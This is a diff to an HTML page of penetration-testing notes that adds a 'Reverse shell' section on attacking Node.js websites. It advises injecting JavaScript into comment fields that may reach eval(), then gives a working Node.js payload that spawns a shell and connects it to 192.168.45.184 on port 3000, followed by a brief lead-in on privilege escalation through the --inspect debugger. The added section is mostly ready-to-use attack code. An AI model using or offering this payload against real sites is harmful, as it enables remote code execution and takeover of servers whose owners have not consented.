@@ -24,6 +24,30 @@
         </div>
         <div class="notion-body">
 
+            <h2>Reverse shell</h2>
+            <ul>
+                <p>In case you are in front of a website which is being built using Node.js <b>Check wappalizer</b> we shoud try to insert the following payload in certain parts of the website which will process that content. For example a post section where you can post comments about anything</p>
+                <p>This is because the application may be using the <b>eval()</b> function</p>
+                <pre><code class="language-bash">(function(){
+   return 2+2;
+})();</code></pre>
+                <p>Then go use the following to perform the revshell</p>
+                <pre><code class="language-bash">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(3000, "192.168.45.184", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();;</code></pre>
+                
+                
+            </ul>
+
             <h2>Privilege escalation</h2>
             <ul>
                 <p>When nodejs is started with the <b>--inspect</b> switch, a Node.js process listens for a debugging client. By default, it will listen at host and port 127.0.0.1:9229. Each process is also assigned a unique UUID. An example of nodejs runing like said is:</p>
